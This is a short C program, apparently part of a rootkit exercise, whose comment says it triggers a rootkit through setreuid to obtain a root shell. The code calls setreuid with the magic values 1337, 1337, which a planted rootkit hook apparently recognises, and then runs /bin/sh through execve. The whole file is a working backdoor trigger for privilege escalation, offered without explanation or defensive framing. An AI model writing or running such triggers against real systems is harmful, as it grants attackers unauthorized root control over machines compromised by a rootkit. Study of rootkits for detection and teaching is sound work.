//This makes a call to the root kit funiton setreuid and creates a root chell

#include <unistd.h>
#include <sys/syscall.h>

int main(){


    syscall(SYS_setreuid, 1337, 1337);

    execve("/bin/sh", NULL, NULL);

    return 0;

}
